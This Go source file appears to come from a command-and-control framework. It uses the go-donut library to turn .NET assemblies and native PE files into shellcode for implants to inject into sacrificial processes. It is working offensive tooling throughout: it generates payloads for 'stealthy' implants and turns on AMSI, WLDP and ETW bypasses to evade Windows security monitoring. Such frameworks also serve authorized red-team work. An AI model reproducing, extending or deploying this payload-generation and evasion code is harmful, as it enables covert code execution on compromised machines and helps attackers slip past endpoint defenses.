package main

import (
	"bytes"
	"debug/pe"
	"fmt"
	"strings"

	pb "silkwire/proto"

	"github.com/Binject/go-donut/donut"
	"github.com/sirupsen/logrus"
)

// mapArchToDonut converts Go architecture strings to Donut architecture types
// This ensures the generated shellcode matches the target implant's architecture
func mapArchToDonut(goArch string) donut.DonutArch {
	switch strings.ToLower(goArch) {
	case "386":
		return donut.X32 // 32-bit only
	case "amd64", "x64":
		return donut.X64 // 64-bit only
	case "arm64":
		return donut.X64 // ARM64 uses 64-bit
	default:
		// For unknown or mixed architectures, use X84 (supports both 32-bit and 64-bit)
		// This is the safest fallback but produces larger shellcode
		logrus.Warnf("Unknown architecture '%s', defaulting to X84 (32+64 bit)", goArch)
		return donut.X84
	}
}

// convertAssemblyToShellcode converts a .NET assembly to position-independent shellcode using go-donut
// This is done SERVER-SIDE to keep the implant small and reduce its attack surface
//
// Architecture:
// - Server: Performs heavy Donut conversion (has resources, doesn't need stealth)
// - Implant: Receives shellcode and spawns/injects (small, simple, stealthy)
//
// Flow:
// 1. Server receives .NET assembly from console
// 2. Server converts assembly to shellcode via Donut (this function)
// 3. Server sends shellcode to implant (architecture-specific)
// 4. Implant spawns sacrificial process and injects shellcode
// 5. Donut loader in sacrificial process bootstraps CLR and executes assembly
func (s *C2Server) convertAssemblyToShellcode(assemblyBytes []byte, args []string, options *pb.ExecuteAssemblyOptions, implantArch string) ([]byte, error) {
	// Determine target architecture from implant
	// This ensures we generate shellcode optimized for the target system
	donutArch := mapArchToDonut(implantArch)

	// Configure Donut for assembly-to-shellcode conversion
	// Determine if this is a DLL or EXE based on class/method options
	var moduleType donut.ModuleType = donut.DONUT_MODULE_NET_EXE // Default to EXE
	if options != nil && (options.ClassName != "" || options.MethodName != "") {
		moduleType = donut.DONUT_MODULE_NET_DLL // DLL if class/method specified
		logrus.Debugf("Donut: Detected DLL assembly (class: %s, method: %s)", options.ClassName, options.MethodName)
	}

	// Use Donut's default config and only override what Merlin overrides
	// This matches Merlin's exact configuration (merlin/pkg/services/rpc/agent.go:164-170)
	donutConfig := donut.DefaultConfig()
	donutConfig.Arch = donutArch       // Set architecture based on implant
	donutConfig.Type = moduleType      // DONUT_MODULE_NET_EXE (2) or DONUT_MODULE_NET_DLL (3)
	donutConfig.ExitOpt = 2            // Exit process when done
	donutConfig.Runtime = "v4.0.30319" // .NET 4.x runtime
	donutConfig.Entropy = 3            // DONUT_ENTROPY_DEFAULT
	// Donut uses comma-separated parameters (converted internally to string[] args)
	if len(args) > 0 {
		donutConfig.Parameters = strings.Join(args, ",")
		logrus.Debugf("Donut: Assembly arguments: %s", donutConfig.Parameters)
	}

	// Set class and method for DLL assemblies
	if options != nil && options.ClassName != "" {
		donutConfig.Class = options.ClassName
		logrus.Debugf("Donut: DLL class name: %s", options.ClassName)
	}
	if options != nil && options.MethodName != "" {
		donutConfig.Method = options.MethodName
		logrus.Debugf("Donut: DLL method name: %s", options.MethodName)
	}

	// Set .NET runtime version
	// Common values: "v2.0.50727" (.NET 2.0-3.5), "v4.0.30319" (.NET 4.x)
	runtime := "v4.0.30319" // Default to .NET 4.x
	if options != nil && options.Runtime != "" {
		runtime = options.Runtime
	}
	donutConfig.Runtime = runtime

	// Set assembly arguments (passed to Main(string[] args))
	// Donut uses comma-separated parameters internally
	if len(args) > 0 {
		donutConfig.Parameters = strings.Join(args, ",")
		logrus.Debugf("Donut: Assembly arguments: %s", donutConfig.Parameters)
	}

	// AMSI/WLDP/ETW bypass configuration
	// Bypass values:
	//   1 = Skip bypass (no AMSI/WLDP bypass)
	//   2 = Abort if bypass fails
	//   3 = Continue even if bypass fails (recommended for operational resilience)
	if options != nil && (options.AmsiBypass || options.EtwBypass) {
		donutConfig.Bypass = 3 // Continue with AMSI/WLDP/ETW bypass
		logrus.Debugf("Donut: AMSI/WLDP/ETW bypass enabled (continue on failure)")
	}

	// Convert assembly bytes to position-independent shellcode via Donut
	archStr := "X84"
	switch donutArch {
	case donut.X32:
		archStr = "X32 (32-bit)"
	case donut.X64:
		archStr = "X64 (64-bit)"
	case donut.X84:
		archStr = "X84 (32+64-bit)"
	}

	logrus.Infof("Donut: Converting %d bytes of .NET assembly to shellcode (arch: %s, runtime: %s)...",
		len(assemblyBytes), archStr, runtime)

	shellcode, err := donut.ShellcodeFromBytes(bytes.NewBuffer(assemblyBytes), donutConfig)
	if err != nil {
		logrus.Errorf("Donut conversion failed: %v", err)
		return nil, fmt.Errorf("donut conversion failed: %v", err)
	}

	shellcodeBytes := shellcode.Bytes()
	compressionRatio := float64(len(assemblyBytes)) / float64(len(shellcodeBytes))

	logrus.Infof("Donut: Successfully generated %d bytes of shellcode (%.2fx size of assembly)",
		len(shellcodeBytes), compressionRatio)
	logrus.Debugf("Donut: Configuration - Arch: %s, Entropy: %d, Bypass: %d, Compress: %d",
		archStr, donutConfig.Entropy, donutConfig.Bypass, donutConfig.Compress)

	return shellcodeBytes, nil
}

// convertPEToShellcode converts a native PE (EXE/DLL) into Donut shellcode
// so implants can inject it using the sacrificial process helper.
func (s *C2Server) convertPEToShellcode(peBytes []byte, args []string, implantArch string) ([]byte, error) {
	if len(peBytes) == 0 {
		return nil, fmt.Errorf("no PE bytes provided")
	}

	donutArch := mapArchToDonut(implantArch)
	isDLL := detectPEIsDLL(peBytes)

	donutConfig := donut.DefaultConfig()
	donutConfig.Arch = donutArch
	donutConfig.ExitOpt = 2 // terminate sacrificial process on completion
	donutConfig.Thread = 1  // run entrypoint as thread
	donutConfig.Type = donut.DONUT_MODULE_EXE
	if isDLL {
		donutConfig.Type = donut.DONUT_MODULE_DLL
	}

	if len(args) > 0 {
		// Native PE command-line arguments are provided as a space-separated string
		donutConfig.Parameters = strings.Join(args, " ")
		logrus.Debugf("Donut: PE arguments: %s", donutConfig.Parameters)
	}

	archStr := "X84"
	switch donutArch {
	case donut.X32:
		archStr = "X32 (32-bit)"
	case donut.X64:
		archStr = "X64 (64-bit)"
	case donut.X84:
		archStr = "X84 (32+64-bit)"
	}

	moduleKind := "EXE"
	if isDLL {
		moduleKind = "DLL"
	}

	logrus.Infof("Donut: Converting native %s (%d bytes) to shellcode (arch: %s)",
		moduleKind, len(peBytes), archStr)

	shellcode, err := donut.ShellcodeFromBytes(bytes.NewBuffer(peBytes), donutConfig)
	if err != nil {
		logrus.Errorf("Donut PE conversion failed: %v", err)
		return nil, fmt.Errorf("donut conversion failed: %v", err)
	}

	shellcodeBytes := shellcode.Bytes()
	ratio := float64(len(peBytes)) / float64(len(shellcodeBytes))

	logrus.Infof("Donut: PE conversion successful -> %d bytes shellcode (%.2fx size of PE)",
		len(shellcodeBytes), ratio)
	logrus.Debugf("Donut: Configuration - Module=%s, Arch=%s, Parameters=%q",
		moduleKind, archStr, donutConfig.Parameters)

	return shellcodeBytes, nil
}

// detectPEIsDLL best-effort detection of whether a PE file is a DLL.
func detectPEIsDLL(peBytes []byte) bool {
	f, err := pe.NewFile(bytes.NewReader(peBytes))
	if err != nil {
		return false
	}
	defer f.Close()

	return f.FileHeader.Characteristics&pe.IMAGE_FILE_DLL != 0
}
